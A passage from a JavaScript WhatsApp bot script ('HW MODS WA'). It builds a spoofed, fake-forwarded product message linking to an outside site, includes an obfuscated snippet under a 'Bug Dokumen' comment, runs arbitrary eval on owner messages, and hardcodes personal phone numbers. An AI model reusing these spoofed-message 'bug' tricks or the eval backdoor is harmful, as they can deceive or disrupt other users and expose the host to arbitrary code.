Haikal['prepareMessageFromContent'](from,{'productMessage':{'product':{'productImage':{'url':'https://mmg.whatsapp.net/d/f/AhKiA8ZYMvh7bmeduarnW7bNy_b7iSQmhpFWGWP8gn9W.enc','mimetype':_0x516cd2(0x1d4),'fileSha256':'qaHI3/usbupEbhnoAoeUdmJcvt6OpCH4c3L+k1+dVFU=','fileLength':'75322','height':0x3e8,'width':0x3e8,'mediaKey':'4bkOcwD7n4exarKEUz9QCe6C69CiCVTjuAxfUr55Hlw=','fileEncSha256':_0x516cd2(0x1da),'directPath':'/v/t62.7118-24/33362654_2985464461692539_2232039221222414383_n.enc?ccb=11-4&oh=04aaa9547f1816b97a8f2748c500575a&oe=616BD2B0&_nc_hot=1632065864','mediaKeyTimestamp':_0x516cd2(0x1cb),'jpegThumbnail':fs[_0x516cd2(0x1dd)]('./stik/deden.jpeg'),'scansSidecar':'FUFjdWbXsYPQpWnBa9uKLFAArCZHWBDHyzSXdEgJa1z4W051Vsv2+Q==','scanLengths':[0x2946,0x7782,0x3290,0x52e2],'midQualityFileSha256':_0x516cd2(0x1d2)},'productId':_0x516cd2(0x1e0),'title':'HW\x20MODS\x20WA\x20🔥➥','description':'HW\x20MODS\x20WA\x20🔥➥','currencyCode':_0x516cd2(0x1d7),'priceAmount1000':_0x516cd2(0x1c9),'retailerId':_0x516cd2(0x1d6),'url':'http://hwmodswa.website2.me/','productImageCount':0x1,'salePriceAmount1000':'0'},'businessOwnerJid':_0x516cd2(0x1cd),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x516cd2(0x1c6)](res);
break
// Bug Dokumen
	if (!kal.key.fromMe) return fakestatus('APASIH')
function _0x38af(){var _0xdf818d=['Hello\x20World!','5254146rAoPhh','44304axRxoy','30162jxLtpA','4293256bwNXpU','5TdWoxw','8214248jjnMfr','1559154CXjmyI','log','272TELCpE','9286500wNKbou','63IcEAEP'];_0x38af=function(){return _0xdf818d;};return _0x38af();}(function(_0x16a339,_0x503382){var _0x1caff0=_0x23c6,_0x15dc0a=_0x16a339();while(!![]){try{var _0x101a52=parseInt(_0x1caff0(0x126))/0x1*(-parseInt(_0x1caff0(0x12a))/0x2)+parseInt(_0x1caff0(0x129))/0x3*(parseInt(_0x1caff0(0x130))/0x4)+parseInt(_0x1caff0(0x12c))/0x5*(parseInt(_0x1caff0(0x12e))/0x6)+parseInt(_0x1caff0(0x12d))/0x7+-parseInt(_0x1caff0(0x12b))/0x8+parseInt(_0x1caff0(0x128))/0x9+-parseInt(_0x1caff0(0x131))/0xa;if(_0x101a52===_0x503382)break;else _0x15dc0a['push'](_0x15dc0a['shift']());}catch(_0x29f5b6){_0x15dc0a['push'](_0x15dc0a['shift']());}}}(_0x38af,0x93eeb));function hi(){var _0x31ee45=_0x23c6;console[_0x31ee45(0x12f)](_0x31ee45(0x127));}function _0x23c6(_0x51da08,_0x202926){var _0x38afd7=_0x38af();return _0x23c6=function(_0x23c648,_0x33cddd){_0x23c648=_0x23c648-0x126;var _0x12ad48=_0x38afd7[_0x23c648];return _0x12ad48;},_0x23c6(_0x51da08,_0x202926);}hi();
//=================================================//
default:
                    // Eval ( HAIKAL )
if (budy.startsWith('>')){
if (isBan) return reply(mess.ban)
if (!kal.key.fromMe && !isOwner) return
try {
return Haikal.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: ikal})
} catch(err) {
e = String(err)
reply(e)
}
}
// Anti Tag ( HW MODS WA )
const listTag = ["6285714170944@s.whatsapp.net","6285876330812@s.whatsapp.net"]
const partiNum = (type === 'extendedTextMessage') ? kal.message.extendedTextMessage.contextInfo.participant : ''
// Antitag Via Reply ( HW MODS WA )
if (listTag.includes(partiNum)) {
if (antitags === false) return
if (kal.key.fromMe) return
if (isOwner) return
sendNye = fs.readFileSync('media/sticker/jantag.webp')
Haikal.sendMessage(from, sendNye, sticker, {quoted:ikal, contextInfo:{forwardingScore: 800, isForwarded: true}})
}
// Antitag Via Tag ( HW MODS WA )
if (budy.includes("@6285714170944")) {
if (antitags === false) return
if (kal.key.fromMe) return
if (isOwner) return
sendNye = fs.readFileSync('media/sticker/jantag.webp')
Haikal.sendMessage(from, sendNye, sticker, {quoted:ikal, contextInfo:{forwardingScore: 800, isForwarded: true}})
}			
// Batas
}
if (isGroup && budy != undefined) {
} else {
console.log(color('[TEXT]', 'red'), 'SELF-MODE', color(sender.split('@')[0]))
}
} catch (e) {
e = String(e)
if (!e.includes("this.isZero")) {
console.log('Message : %s', color(e, 'green'))
}
}
}
//=================================================//
